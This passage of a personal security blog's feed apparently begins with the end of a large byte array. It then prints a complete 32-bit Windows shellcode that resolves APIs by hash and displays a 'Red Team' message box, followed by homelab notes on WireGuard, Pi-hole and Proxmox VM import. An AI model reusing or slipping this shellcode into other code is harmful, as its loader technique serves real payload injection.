0xe8, 0xaf, 0xf8, 0xaf, 0x0, 0x0, 0x0, 0x20, 0x1, 0x0, 0x10, 0x1, 0x0, 0x0, 0x8, 0xa0, 0x18, 0xa0, 0x28, 0xa0, 0x38, 0xa0, 0x48, 0xa0, 0x58, 0xa0, 0x68, 0xa0, 0x78, 0xa0, 0x88, 0xa0, 0x98, 0xa0, 0xa8, 0xa0, 0xb8, 0xa0, 0xc8, 0xa0, 0xd8, 0xa0, 0xe8, 0xa0, 0xf8, 0xa0, 0x8, 0xa1, 0x18, 0xa1, 0x28, 0xa1, 0x38, 0xa1, 0x48, 0xa1, 0x58, 0xa1, 0x68, 0xa1, 0x78, 0xa1, 0x88, 0xa1, 0x98, 0xa1, 0xa8, 0xa1, 0xb8, 0xa1, 0xc8, 0xa1, 0xd8, 0xa1, 0xe8, 0xa1, 0xf8, 0xa1, 0x8, 0xa2, 0x18, 0xa2, 0x28, 0xa2, 0x38, 0xa2, 0x48, 0xa2, 0x58, 0xa2, 0x68, 0xa2, 0x78, 0xa2, 0x88, 0xa2, 0x98, 0xa2, 0xa8, 0xa2, 0xb8, 0xa2, 0xc8, 0xa2, 0xd8, 0xa2, 0xe8, 0xa2, 0xf8, 0xa2, 0x8, 0xa3, 0x18, 0xa3, 0x28, 0xa3, 0x38, 0xa3, 0x48, 0xa3, 0x58, 0xa3, 0x68, 0xa3, 0x78, 0xa3, 0x88, 0xa3, 0x98, 0xa3, 0xa8, 0xa3, 0xb8, 0xa3, 0xc8, 0xa3, 0xd8, 0xa3, 0xe8, 0xa3, 0xf8, 0xa3, 0x8, 0xa4, 0x18, 0xa4, 0x28, 0xa4, 0x38, 0xa4, 0x48, 0xa4, 0x58, 0xa4, 0x68, 0xa4, 0x78, 0xa4, 0x88, 0xa4, 0x98, 0xa4, 0xa8, 0xa4, 0xb8, 0xa4, 0xc8, 0xa4, 0xd8, 0xa4, 0xe8, 0xa4, 0xf8, 0xa4, 0x8, 0xa5, 0x18, 0xa5, 0x28, 0xa5, 0x38, 0xa5, 0x48, 0xa5, 0x58, 0xa5, 0x68, 0xa5, 0x78, 0xa5, 0x88, 0xa5, 0x98, 0xa5, 0xa8, 0xa5, 0xb8, 0xa5, 0xc8, 0xa5, 0xd8, 0xa5, 0xe8, 0xa5, 0xf8, 0xa5, 0x8, 0xa6, 0x18, 0xa6, 0x28, 0xa6, 0x38, 0xa6, 0x48, 0xa6, 0x58, 0xa6, 0x68, 0xa6, 0x78, 0xa6, 0x88, 0xa6, 0x98, 0xa6, 0xa8, 0xa6, 0xb8, 0xa6, 0xc8, 0xa6, 0xd8, 0xa6, 0xe8, 0xa6, 0xf8, 0xa6, 0x8, 0xa7, 0x18, 0xa7, 0x28, 0xa7, 0x38, 0xa7, 0x48, 0xa7, 0x58, 0xa7, 0x68, 0xa7, 0x78, 0xa7, 0x88, 0xa7, 0x98, 0xa7, 0xa8, 0xa7, 0xb8, 0xa7, 0xc8, 0xa7, 0xd8, 0xa7, 0xe8, 0xa7, 0xf8, 0xa7, 0x8, 0xa8, 0x18, 0xa8, 0x28, 0xa8, 0x0, 0x0, 0x0, 0x30, 0x1, 0x0, 0x80, 0x1, 0x0, 0x0, 0x50, 0xa4, 0x60, 0xa4, 0x70, 0xa4, 0x80, 0xa4, 0x90, 0xa4, 0xa0, 0xa4, 0xb0, 0xa4, 0xc0, 0xa4, 0xd0, 0xa4, 0xe0, 0xa4, 0xf0, 0xa4, 0x0, 0xa5, 0x10, 0xa5, 0x20, 0xa5, 0x30, 0xa5, 0x40, 0xa5, 0x50, 0xa5, 0x60, 0xa5, 0x70, 0xa5, 0x80, 0xa5, 0x90, 0xa5, 0xa0, 0xa5, 0xb0, 0xa5, 0xc0, 0xa5, 0xd0, 0xa5, 0xe0, 0xa5, 0xf0, 0xa5, 0x0, 0xa6, 0x10, 0xa6, 0x20, 0xa6, 0x30, 0xa6, 0x40, 0xa6, 0x50, 0xa6, 0x60, 0xa6, 0x70, 0xa6, 0x80, 0xa6, 0x90, 0xa6, 0xa0, 0xa6, 0xb0, 0xa6, 0xc0, 0xa6, 0xd0, 0xa6, 0xe0, 0xa6, 0xf0, 0xa6, 0x0, 0xa7, 0x10, 0xa7, 0x20, 0xa7, 0x30, 0xa7, 0x40, 0xa7, 0x50, 0xa7, 0x60, 0xa7, 0x70, 0xa7, 0x80, 0xa7, 0x90, 0xa7, 0xa0, 0xa7, 0xb0, 0xa7, 0xc0, 0xa7, 0xd0, 0xa7, 0xe0, 0xa7, 0xf0, 0xa7, 0x0, 0xa8, 0x10, 0xa8, 0x20, 0xa8, 0x30, 0xa8, 0x40, 0xa8, 0x50, 0xa8, 0x60, 0xa8, 0x70, 0xa8, 0x80, 0xa8, 0x90, 0xa8, 0xa0, 0xa8, 0xb0, 0xa8, 0xc0, 0xa8, 0xd0, 0xa8, 0xe0, 0xa8, 0xf0, 0xa8, 0x0, 0xa9, 0x10, 0xa9, 0x20, 0xa9, 0x30, 0xa9, 0x40, 0xa9, 0x50, 0xa9, 0x60, 0xa9, 0x70, 0xa9, 0x80, 0xa9, 0x90, 0xa9, 0xa0, 0xa9, 0xb0, 0xa9, 0xc0, 0xa9, 0xd0, 0xa9, 0xe0, 0xa9, 0xf0, 0xa9, 0x0, 0xaa, 0x10, 0xaa, 0x20, 0xaa, 0x30, 0xaa, 0x40, 0xaa, 0x50, 0xaa, 0x60, 0xaa, 0x70, 0xaa, 0x80, 0xaa, 0x90, 0xaa, 0xa0, 0xaa, 0xb0, 0xaa, 0xc0, 0xaa, 0xd0, 0xaa, 0xe0, 0xaa, 0xf0, 0xaa, 0x0, 0xab, 0x10, 0xab, 0x20, 0xab, 0x30, 0xab, 0x40, 0xab, 0x50, 0xab, 0x60, 0xab, 0x70, 0xab, 0x80, 0xab, 0x90, 0xab, 0xa0, 0xab, 0xb0, 0xab, 0xc0, 0xab, 0xd0, 0xab, 0xe0, 0xab, 0xf0, 0xab, 0x0, 0xac, 0x10, 0xac, 0x20, 0xac, 0x30, 0xac, 0x40, 0xac, 0x50, 0xac, 0x60, 0xac, 0x70, 0xac, 0x80, 0xac, 0x90, 0xac, 0xa0, 0xac, 0xb0, 0xac, 0xc0, 0xac, 0xd0, 0xac, 0xe0, 0xac, 0xf0, 0xac, 0x0, 0xad, 0x10, 0xad, 0x20, 0xad, 0x30, 0xad, 0x40, 0xad, 0x50, 0xad, 0x60, 0xad, 0x70, 0xad, 0x80, 0xad, 0x90, 0xad, 0xa0, 0xad, 0xb0, 0xad, 0xc0, 0xad, 0xd0, 0xad, 0xe0, 0xad, 0xf0, 0xad, 0x0, 0xae, 0x10, 0xae, 0x20, 0xae, 0x30, 0xae, 0x40, 0xae, 0x50, 0xae, 0x60, 0xae, 0x70, 0xae, 0x80, 0xae, 0x90, 0xae, 0xa0, 0xae, 0xb0, 0xae, 0xc0, 0xae, 0xd0, 0xae, 0xe0, 0xae, 0xf0, 0xae, 0x0, 0xaf, 0x10, 0xaf, 0x20, 0xaf, 0x30, 0xaf, 0x40, 0xaf, 0x50, 0xaf, 0x60, 0xaf, 0x70, 0xaf, 0x80, 0xaf, 0x90, 0xaf, 0xa0, 0xaf, 0xb0, 0xaf, 0xc0, 0xaf, 0xd0, 0xaf, 0xe0, 0xaf, 0xf0, 0xaf, 0x0, 0x0, 0x0, 0x40, 0x1, 0x0, 0x5c, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x10, 0xa0, 0x20, 0xa0, 0x30, 0xa0, 0x40, 0xa0, 0x50, 0xa0, 0x60, 0xa0, 0x70, 0xa0, 0x80, 0xa0, 0x90, 0xa0, 0xa0, 0xa0, 0xb0, 0xa0, 0xc0, 0xa0, 0xd0, 0xa0, 0xe0, 0xa0, 0xf0, 0xa0, 0x0, 0xa1, 0x10, 0xa1, 0x20, 0xa1, 0x30, 0xa1, 0x40, 0xa1, 0x50, 0xa1, 0x60, 0xa1, 0x70, 0xa1, 0x80, 0xa1, 0x90, 0xa1, 0xa0, 0xa1, 0xb0, 0xa1, 0xc0, 0xa1, 0xd0, 0xa1, 0xe0, 0xa1, 0xf0, 0xa1, 0x0, 0xa2, 0x10, 0xa2, 0x20, 0xa2, 0x30, 0xa2, 0x40, 0xa2, 0x50, 0xa2, 0x60, 0xa2, 0x70, 0xa2, 0x80, 0xa2, 0x0, 0x0, 0x0, 0x60, 0x1, 0x0, 0x20, 0x0, 0x0, 0x0, 0xc0, 0xa7, 0xc8, 0xa7, 0xd0, 0xa7, 0xd8, 0xa7, 0x58, 0xa8, 0x70, 0xa8, 0x78, 0xa8, 0x0, 0xa9, 0x18, 0xa9, 0x20, 0xa9, 0x28, 0xa9, 0x30, 0xa9, 0x0, 0x90, 0x1, 0x0, 0x4c, 0x0, 0x0, 0x0, 0xd0, 0xa6, 0x18, 0xa7, 0x38, 0xa7, 0x58, 0xa7, 0x78, 0xa7, 0x98, 0xa7, 0xc8, 0xa7, 0xe0, 0xa7, 0xe8, 0xa7, 0xf0, 0xa7, 0x28, 0xa8, 0x30, 0xa8, 0x50, 0xa9, 0x58, 0xa9, 0x60, 0xa9, 0x68, 0xa9, 0x70, 0xa9, 0x78, 0xa9, 0x80, 0xa9, 0x88, 0xa9, 0x90, 0xa9, 0x98, 0xa9, 0xa8, 0xa9, 0xb0, 0xa9, 0xb8, 0xa9, 0xc0, 0xa9, 0xc8, 0xa9, 0xd0, 0xa9, 0xd8, 0xa9, 0xe0, 0xa9, 0x20, 0xab, 0x48, 0xab, 0x70, 0xab, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x61, 0x76, 0x65 };
</code></pre><h2 id="32-bit">32-bit</h2>
<h3 id="32-bit-messagebox-shellcode">(32-bit) MessageBox shellcode</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode32[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x31</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x8b</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xf3</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x45</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x5a</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0x31</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0x0d</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x5a</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xeb</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xb2</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0xec</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xce</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x89</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x64</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x89</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x4d</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x44</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x4f</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x0b</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x21</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x65</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x72</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x4c</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x08</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/homelab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/homelab/</guid>
      <description><![CDATA[<h1 id="hardware--software-setup">Hardware / Software setup</h1>
<h2 id="orange-pi-5-8gb-ram">Orange Pi 5 8GB RAM</h2>
<ul>
<li>Ubuntu OS for OrangePi (debian works strange with pihole and some other containers, have tested).</li>
<li>Static IP address in LAN (192.168.0.2).</li>
<li>Docker containers:
<ul>
<li>Wireguard -&gt; VPN easy to manage</li>
<li>Pihole -&gt; Act as DNS server</li>
<li>Syncthing -&gt; Backup of courses, blog, etc</li>
</ul>
</li>
</ul>
<h1 id="steps-to-deploy-homelab">Steps to deploy homelab</h1>
<ol>
<li>Disable CGNAT</li>
<li>Enable Port Forwarding from 0.0.0.0 WAN to Orange PI LAN IP (UDP port 51820)</li>
<li>Assign Orange PI LAN IP as main DNS</li>
<li>Assign Static IP to Orange Pi</li>
<li>Enable docker containers (<strong>Note: User <code>docker compose</code>, not docker-compose. Install docker from official repo via curl, not apt</strong>)
Router assigns 192.168.0.128 to 192.168.0.255 via DHCP
192.168.0.2 to 192.168.0.127 are IP addresses for my personal lab devices.</li>
</ol>
<h1 id="proxmox">Proxmox</h1>
<h2 id="steps-to-add-new-disk">Steps to add new disk</h2>
<pre tabindex="0"><code>You would need to format the drive via the UI (Click on the Node &gt; Disks &gt; Select your disk &gt; Initialize disk with GPT). Depending on what kind of storage you want to create with your disk, the next steps differ.  
  
If you want to create a directory storage, you would simply navigate to Directory in the sidebar and then click &#39;Create&#39;. There you just supply the sdb disk and enter a name and a type of filesystem.  
Be aware that Directory storage does not support many features offered by PVE such as Snapshots (you can check the capabilities of the different storage types in our documentation: [1]).  
  
You could also create an LVM-thin storage, which provides more features than a simple directory storage (which is probably what you currently have on your existing disk with name local). For this, instead of going to Directory in the sidebar, you can navigate to LVM-thin, then click &#39;Create Thinpool&#39; . Then you just enter a name for your new pool and wait until the creation has finished. Your disk should then be ready to use. I would recommend for you to use this for now as LVM-thin offers more features and capabilities than simple Directory storage, while still being relatively simple to use for beginners.  
  
[1] [https://pve.proxmox.com/pve-docs/pve-admin-guide.html#_storage_types](https://pve.proxmox.com/pve-docs/pve-admin-guide.html#_storage_types)
</code></pre><h2 id="steps-to-import-vm">Steps to import VM</h2>
<h3 id="qcow-format">QCOW format</h3>
<p>Push via SCP qcow file in qcow folder:</p>
<pre tabindex="0"><code>scp /home/jaco/Documents/osed-offline/VM/VM-OSED-X86-01.qcow2 root@192.168.0.4:/var/lib/vz/template/qcow/osed.qcow2
</code></pre><p>Import the disk to the previously created VM (create a VM without disk):</p>
<pre tabindex="0"><code>qm importdisk &lt;VM ID&gt; &lt;qcow2 image&gt; &lt;storage name&gt;
qm importdisk 101 -f qcow2 osed.qcow2 vms_storage
